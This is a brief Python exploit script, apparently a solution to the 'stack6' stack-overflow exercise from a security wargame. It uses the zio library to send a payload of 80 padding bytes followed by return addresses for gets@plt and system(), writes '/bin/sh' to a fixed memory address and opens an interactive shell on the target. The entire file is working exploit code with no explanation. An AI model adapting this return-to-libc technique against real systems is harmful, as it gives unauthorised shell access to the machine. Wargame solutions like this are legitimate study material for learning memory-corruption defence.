from zio import *
target  = './stack6'
c_read  = COLORED(RAW, 'green')
c_write = COLORED(RAW, 'blue')
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x080484f9])

adr_system  = 0xbfecffb0
plt_gets    = 0x08048380
p_ret       = 0x08048453
adr_stage   = 0x08049000

payload1    = 'A' * 80
payload1    += l32(plt_gets)
payload1    += l32(p_ret)
payload1    += l32(adr_stage)
payload1    += l32(adr_system)
payload1    += l32(0xdeadbeef)
payload1    += l32(adr_stage)

io.read_until("input path please:")
io.writeline(payload1)
io.writeline('/bin/sh\x00')

io.interact()
